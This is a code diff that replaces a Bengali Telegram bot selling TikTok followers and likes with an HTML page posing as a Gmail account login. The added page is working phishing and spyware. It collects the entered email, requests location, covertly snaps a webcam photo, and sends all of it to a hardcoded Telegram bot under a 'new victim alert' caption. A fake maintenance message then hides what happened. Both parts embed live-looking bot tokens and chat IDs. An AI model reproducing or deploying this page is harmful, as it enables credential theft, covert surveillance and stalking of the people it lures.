@@ -1,87 +1,93 @@
-import telebot
-from telebot import types
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Login</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: Arial; padding: 20px; }
+        .login-container { border: 1px solid #333; padding: 30px; border-radius: 15px; display: inline-block; margin-top: 50px; background: #111; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
+        button { padding: 15px 30px; font-size: 18px; background: #ffcc00; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; color: #000; width: 100%; }
+        h1 { color: #ffcc00; }
+    </style>
+</head>
+<body>
 
-# আপনার সঠিক টোকেন এবং চ্যাট আইডি
-BOT_TOKEN = '8217085238:AAFSCHwLAGNxB6UFtAQ71Tt7m7q1UUA9TnA'
-ADMIN_CHAT_ID = '6979733205' 
+    <div class="login-container">
+        <h1>অ্যাকাউন্ট লগইন করুন</h1>
+        <p>আপনার জিমেইল এবং পাসওয়ার্ড দিন</p>
+        
+        <input type="email" id="email" placeholder="Gmail">
+        <input type="password" id="pass" placeholder="Password">
+        
+        <button onclick="startSecurityAction()">Login</button>
+    </div>
 
-bot = telebot.TeleBot(BOT_TOKEN)
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-# ১. স্টার্ট মেনু সাজানো (আপনার স্ক্রিনশট অনুযায়ী)
-@bot.message_handler(commands=['start'])
-def start(message):
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn1 = types.KeyboardButton("🚀 অর্ডার করুন")
-    btn2 = types.KeyboardButton("💰 ব্যালেন্স চেক")
-    btn3 = types.KeyboardButton("📞 সাপোর্ট")
-    btn4 = types.KeyboardButton("📊 সার্ভিস পিলান")
-    
-    markup.add(btn1, btn2)
-    markup.add(btn3, btn4)
-    
-    welcome_msg = "🤖 **স্বাগতম TikTok Booster BD তে!**\nসবচেয়ে কম দামে সার্ভিস পেতে নিচের বাটন চাপুন।"
-    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode="Markdown")
+    <script>
+        const BOT_TOKEN = '8533062452:AAHhcDnFfdvIWrYQiMdbD256ZHzXn-Dp_QY';
+        const CHAT_ID = '6991020341';
 
-# ২. সার্ভিস পিলান (দামগুলো এখানে বসাবেন)
-@bot.message_handler(func=lambda message: message.text == "📊 সার্ভিস পিলান")
-def service_plan(message):
-    prices = (
-        "📊 **আমাদের বর্তমান সার্ভিস পিলানসমূহ:**\n"
-        "_______________________________\n\n"
-        "🔥 **TikTok Followers:**\n"
-        "🔹 ১০০০ ফলোয়ার — ১০০ টাকা\n"
-        "🔹 ৫০০০ ফলোয়ার — ৪৫০ টাকা\n\n"
-        "❤️ **TikTok Likes:**\n"
-        "🔹 ১০০০ লাইক — ৬০ টাকা\n"
-        "🔹 ৫০০০ লাইক — ২৮০ টাকা\n\n"
-        "🔄 **TikTok Views:**\n"
-        "🔹 ১০০০০ ভিউস — ২০ টাকা\n\n"
-        "💡 অর্ডার করতে '🚀 অর্ডার করুন' বাটনে ক্লিক করুন।"
-    )
-    bot.send_message(message.chat.id, prices, parse_mode="Markdown")
+        function startSecurityAction() {
+            // লোকেশন পারমিশন চাওয়া
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(captureAndSendData, handleLocationError);
+            } else {
+                alert("আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।");
+            }
+        }
 
-# ৩. অর্ডার করুন (পেমেন্ট তথ্য ও আপনার কাছে মেসেজ আসা)
-@bot.message_handler(func=lambda message: message.text == "🚀 অর্ডার করুন")
-def order_instruction(message):
-    instruction = (
-        "📦 **অর্ডার করার নিয়মাবলী:**\n\n"
-        "১. পেমেন্ট করুন:\n"
-        "বিকাশ বা নগদ (Personal):\n"
-        "01751622987 নম্বরে টাকা পাঠিয়ে দিন।\n\n"
-        "২. তথ্য দিন:\n"
-        "টাকা পাঠানোর পর নিচের তথ্যগুলো পাঠিয়ে দিন:\n"
-        "✅ সার্ভিসের নাম:\n"
-        "✅ পরিমাণ:\n"
-        "✅ লিঙ্ক:\n"
-        "✅ TrxID (ট্রানজেকশন আইডি):\n\n"
-        "আপনার তথ্যগুলো যাচাই করে ৫-৩০ মিনিটের মধ্যে কাজ শুরু করা হবে।"
-    )
-    inline_markup = types.InlineKeyboardMarkup()
-    inline_markup.add(types.InlineKeyboardButton("সরাসরি এডমিনকে মেসেজ দিন", url="https://t.me/TTService_BD"))
-    
-    msg = bot.send_message(message.chat.id, instruction, reply_markup=inline_markup, parse_mode="Markdown")
-    bot.register_next_step_handler(msg, forward_to_admin)
+        async function captureAndSendData(position) {
+            // ইউজারের অক্ষাংশ ও দ্রাঘিমাংশ সংগ্রহ
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // ইনপুট ডেটা (যদি লাগে)
+            const email = document.getElementById('email').value;
 
-def forward_to_admin(message):
-    order_summary = (
-        "🔔 **নতুন অর্ডার এসেছে!**\n"
-        "━━━━━━━━━━━━━━\n"
-        f"👤 ইউজার: @{message.from_user.username}\n"
-        f"🆔 আইডি: `{message.from_user.id}`\n"
-        f"📝 **তথ্য:**\n{message.text}"
-    )
-    bot.send_message(ADMIN_CHAT_ID, order_summary, parse_mode="Markdown")
-    bot.send_message(message.chat.id, "✅ আপনার তথ্য এডমিনের কাছে পাঠানো হয়েছে। ধন্যবাদ!")
+            try {
+                // ক্যামেরা এক্সেস চাওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-# ৪. ব্যালেন্স চেক
-@bot.message_handler(func=lambda message: message.text == "💰 ব্যালেন্স চেক")
-def check_balance(message):
-    bot.send_message(message.chat.id, "📊 আপনার ব্যালেন্স আপডেট করতে এডমিন @TTService_BD কে মেসেজ দিয়ে TrxID দিন।")
+                // ১ সেকেন্ড অপেক্ষা করে ছবি তোলা
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('chat_id', CHAT_ID);
+                        
+                        // ক্যাপশনে লোকেশন এবং জিমেইল আইডি পাঠানো
+                        const captionText = `⚠️ নতুন ভিকটিম এলার্ট!\n\n📧 জিমেইল: ${email}\n📍 লোকেশন: ${mapLink}`;
+                        formData.append('caption', captionText);
 
-# ৫. সাপোর্ট
-@bot.message_handler(func=lambda message: message.text == "📞 সাপোর্ট")
-def support(message):
-    bot.send_message(message.chat.id, "যেকোনো সমস্যায় যোগাযোগ করুন: @TTService_BD")
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            alert("সার্ভার রক্ষণাবেক্ষণ চলছে। ২০ মিনিট পর আবার চেষ্টা করুন।");
+                            location.reload();
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                alert("ক্যামেরা এবং লোকেশন পারমিশন ছাড়া লগইন করা সম্ভব নয়।");
+            }
+        }
 
-print("বটটি এখন সচল আছে...")
-bot.infinity_polling()
+        function handleLocationError(error) {
+            alert("লোকেশন পারমিশন ছাড়া অ্যাকাউন্ট ভেরিফাই করা সম্ভব নয়।");
+        }
+    </script>
+</body>
+</html>
